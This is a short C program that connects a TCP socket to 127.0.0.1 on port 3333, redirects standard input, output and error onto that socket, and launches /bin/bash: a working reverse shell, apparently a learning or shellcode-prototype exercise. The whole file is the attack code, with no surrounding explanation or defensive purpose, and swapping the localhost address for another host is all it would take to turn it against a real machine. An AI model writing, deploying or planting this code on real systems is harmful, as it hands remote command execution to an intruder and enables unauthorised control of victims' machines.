#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h> 


int main()
{
	int sockfd, portno;
    	struct sockaddr_in serv_addr;
    	struct hostent *server;

	char buffer[256];


    	portno = 3333;
    	sockfd = socket(AF_INET, SOCK_STREAM, 0);
    	server = gethostbyname("127.0.0.1");

    	bzero((char *) &serv_addr, sizeof(serv_addr));
    	serv_addr.sin_family = AF_INET;

     	bcopy((char *)server->h_addr, (char *)&serv_addr.sin_addr.s_addr, server->h_length);

    	serv_addr.sin_port = htons(portno);

	connect(sockfd,(struct sockaddr *) &serv_addr,sizeof(serv_addr));


        //redirect stdin/out/err
        dup2( sockfd, 0 );  /* duplicate socket on stdout */
        dup2( sockfd, 1 );  /* duplicate socket on stderr too */
        dup2( sockfd, 2 );

        //shell
        execve("/bin/bash", 0,0);

	close(sockfd);
    	return 0;
}

